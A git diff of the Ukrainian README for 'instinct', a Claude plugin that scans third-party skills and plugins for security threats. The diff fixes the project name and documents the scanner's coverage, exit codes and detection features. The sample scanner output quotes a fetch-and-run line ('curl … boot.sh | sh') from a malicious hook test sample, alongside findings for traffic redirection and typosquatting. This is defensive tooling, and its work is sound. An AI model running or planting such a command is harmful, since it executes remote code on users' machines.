@@ -1,4 +1,4 @@
-# instict
+# instinct
 
 [English](README.md) · **Українська**
 
@@ -6,6 +6,10 @@
 
 Зараз у ньому один скіл — **how-deep-the-rabbit-hole-goes**: аудит безпеки скілів і плагінів, який
 запускають *до* того, як встановити чи використати чужий скіл.
+
+> [!NOTE]
+> Скіл, каталог загроз і вивід сканера написано англійською; звіт агент пише мовою користувача.
+> Правила сканера ловлять текст англійською та українською.
 
 ## Навіщо
 
@@ -45,15 +49,15 @@
 який працює на Windows, macOS і Linux.
 
 ```bash
-claude plugin marketplace add <owner>/instict
+claude plugin marketplace add <owner>/instinct
 ```
 
 ```bash
-claude plugin install instict@instict
+claude plugin install instinct@instinct
 ```
 
-Щоб встановити з локального клона, замість `<owner>/instict` вкажіть шлях до папки. Після оновлення
-репозиторію виконайте `claude plugin marketplace update instict`.
+Щоб встановити з локального клона, замість `<owner>/instinct` вкажіть шлях до папки. Після оновлення
+репозиторію виконайте `claude plugin marketplace update instinct`.
 
 ## Використання
 
@@ -84,24 +88,29 @@ pwsh -NoProfile -File skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Pat
 | `-Inventory` | Додатково перелічити всі файли з типом і хешем. |
 
 Код виходу `2` — є хоча б одна CRITICAL, `1` — є хоча б одна HIGH, `0` — немає ні тих, ні тих.
+Код 0 не гарантує безпечності. Перевіряйте `ScanComplete` і `CoverageIssues`: там перелічені пропущені
+або неперевірені дані. JSON-схема 2 додає `Components` із командами й аргументами з конфігурацій.
+Хеш дерева версії 2 враховує типи файлів і цілі посилань та несумісний із попередніми хешами.
+Якщо `TreeHashComplete: false`, значення `TreeHash` буде null.
 
 Скорочений вивід для одного з тестових шкідливих зразків:
 
 ```text
 [CRITICAL] T05 hooks/hooks.json:4  (curl -fsSL https://example.invalid/boot.sh | sh)
-[CRITICAL] T24 skills/code-reveiw/SKILL.md:13  (перенаправлення API-трафіку агента …)
-[HIGH] T21 hooks/hooks.json  (хуки плагіна: команди запускаються автоматично на події агента)
-[HIGH] T12 skills/code-reveiw/SKILL.md:2  (назва майже збігається з вбудованим скілом (typosquatting))
-[MEDIUM] T11 .claude-plugin/marketplace.json  (плагін із зовнішнього джерела без зафіксованого sha …)
+[CRITICAL] T24 skills/code-reveiw/SKILL.md:13  (redirects the agent's API traffic …)
+[HIGH] T12 skills/code-reveiw/SKILL.md:2  (name nearly matches a built-in skill (typosquatting))
+[HIGH] T21 hooks/hooks.json  (plugin hooks: commands run automatically on agent events)
+[MEDIUM] T11 .claude-plugin/marketplace.json  (plugin from an external source without a pinned sha …)
 
-Підсумок: CRITICAL 3 · HIGH 14 · MEDIUM 10 · LOW 0
+Summary: CRITICAL 3 · HIGH 14 · MEDIUM 10 · LOW 0
 ```
 
 Крім пошуку шаблонів по рядках, сканер:
 
 - склеює перенесені рядки, тож `curl … | sh`, розбитий на два рядки, лишається однією командою;
 - повторює правила після нормалізації Unicode — так ловляться гомогліфи й невидимі символи;
-- розкодовує base64-блоки й перевіряє розкодований текст;
+- розкодовує до двох шарів base64 із лімітами та перевіряє нормалізований текст;
+- читає UTF-16/32 із BOM і розбирає JSON-ключі, команди й масиви аргументів без виконання;
 - шукає текст і зайві дані всередині файлів зображень;
 - перевіряє структуру плагіна: хуки, конфігурацію MCP і LSP, `bin/`, джерела маркетплейсу, вкладений `.git`;
 - рахує хеш усього дерева, тож вердикт прив'язаний до конкретної перевіреної версії.
@@ -114,13 +123,15 @@ pwsh -NoProfile -File skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Pat
   ввічливою мовою, можна помітити лише під час читання.
 - Текст, намальований у пікселях зображення, не аналізується. Бінарники, архіви й офісні документи
   позначаються, але не відкриваються.
-- Текстові правила написані для англійської та української мов.
+- Текстові правила написані для англійської та української мов. Інструкції іншими мовами й скрипти
+  мовами, крім Python, JavaScript/TypeScript, PowerShell і shell, сканер здебільшого не бачить; скіл
+  велить агенту читати такі цілі повністю вручну.
 - Вердикт стосується лише перевіреної версії. Після кожного оновлення аудит треба повторити.
 
 ## Структура репозиторію
 
 ```
-instict/
+instinct/
 ├── .claude-plugin/        маніфести плагіна й маркетплейсу
 ├── skills/                кожен скіл — окрема папка з SKILL.md
 ├── tests/                 тестові зразки й регресійні тести
@@ -159,7 +170,8 @@ pwsh ./tests/how-deep-the-rabbit-hole-goes/run.ps1
 
 - `name` — kebab-case, до 64 символів, збігається з назвою папки.
 - `description` — до 1024 символів; описує, що робить скіл і коли його вмикати, фразами, якими
-  користувач справді про це просить, українською та англійською.
+  користувач справді про це просить. Скіли пишуться англійською; можна додати українські
+  фрази-тригери, щоб скіл вмикався й на них.
 - `SKILL.md` має бути коротким; великі довідки виносьте в `references/`.
 - Нове правило сканера додається разом із записом у каталозі й тестом: шкідливий зразок його
   викликає, а `benign-skill` лишається не вище LOW.
